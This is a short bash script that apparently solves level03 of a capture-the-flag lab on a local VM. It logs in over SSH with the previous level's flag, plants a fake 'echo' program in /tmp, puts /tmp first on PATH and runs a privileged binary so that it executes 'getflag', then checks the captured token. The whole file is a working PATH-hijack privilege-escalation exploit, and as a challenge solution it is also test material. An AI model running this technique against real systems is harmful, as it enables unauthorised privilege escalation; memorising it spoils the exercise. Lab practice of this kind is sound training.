#!/bin/bash

VM_ID='192.168.56.3'
ACTUAL_LEVEL=03
PREVIOUS_LEVEL=$(printf %02d $(( ${ACTUAL_LEVEL} - 1)))

if [ ! -f "../../level${PREVIOUS_LEVEL}/flag" ]; then
    echo "../../level${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "getflag" > /tmp/echo' 2> /dev/null

sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'chmod +x /tmp/echo' 2> /dev/null

token="$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'PATH="/tmp:${PATH}" ./level03' 2> /dev/null)"

token="$(echo "${token}" | sed 's/Check flag.Here is your token : \(\S\+\)/\1/' | head -n 1)"

echo "found by script:"
echo "${token}"
echo
echo "from level${ACTUAL_LEVEL}/flag:"
cat ../flag

echo "${token}" > tmp_flag
diff ../flag tmp_flag
rm -f tmp_flag
